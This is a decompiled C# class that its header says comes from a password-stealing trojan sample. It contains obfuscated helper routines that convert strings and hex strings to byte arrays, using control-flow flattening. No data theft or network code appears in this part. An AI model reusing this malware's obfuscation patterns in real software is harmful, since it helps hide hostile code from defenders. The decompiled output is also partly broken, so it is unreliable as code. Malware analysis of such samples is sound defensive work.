// Decompiled with JetBrains decompiler
// Type: ib.fbo
// Assembly: ContingentPropert, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 10450B75-DDB2-42D8-896D-5D92C0FA5DAE
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-PSW.MSIL.Stealer.gen-f9a3872603bab9d16727daf3e24705ff94100d4bf2838679b5e9288aa02bd32a.exe

using System;
using System.Runtime.InteropServices;

namespace ib
{
  public class fbo
  {
    internal static fbo TGp;

    public static byte[] UAx(string _param0)
    {
      int num1 = 1;
label_1:
      int num2 = num1;
      char[] charArray;
      byte[] numArray;
      while (true)
      {
        switch (num2)
        {
          case 1:
            charArray = _param0.Substring(1, fbo.yGM((object) _param0) - 2).ToCharArray();
            num2 = fbo.TGm() ? 0 : 0;
            continue;
          case 2:
            goto label_9;
          default:
            numArray = new byte[charArray.Length];
            for (int index = 0; index < charArray.Length; ++index)
              numArray[index] = (byte) charArray[index];
            if (fbo.TGm())
            {
              num2 = 2;
              continue;
            }
            goto label_1;
        }
      }
label_9:
      return numArray;
    }

    public static byte[] qAv(string _param0)
    {
      int num = 2;
      bool flag;
      while (true)
      {
        switch (num)
        {
          case 1:
            if (flag)
            {
              Xbm.OQS("Could not convert hex string to byte array!");
              num = fbo.XGU() == null ? 0 : 0;
              continue;
            }
            goto label_9;
          case 2:
            flag = !fbo.EGH((object) _param0, (object) "0x");
            num = fbo.XGU() == null ? 1 : 0;
            continue;
          case 3:
            goto label_4;
          default:
            goto label_8;
        }
      }
label_3:
      int startIndex;
      int length;
      byte[] numArray;
      if (startIndex >= length)
        return numArray;
label_4:
      numArray[startIndex / 2] = Convert.ToByte(_param0.Substring(startIndex, 2), 16);
      startIndex += 2;
      goto label_3;
label_8:
label_9:
      _param0 = _param0.Substring(2);
      length = _param0.Length;
      numArray = new byte[length / 2];
      startIndex = 0;
      goto label_3;
    }

    public fbo()
    {
      Jnb.vbPcO4();
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    internal static int yGM([In] object obj0) => ((string) obj0).Length;

    internal static bool TGm() => fbo.TGp == null;

    internal static fbo XGU() => fbo.TGp;

    internal static bool EGH([In] object obj0, [In] object obj1) => ((string) obj0).StartsWith((string) obj1);
  }
}
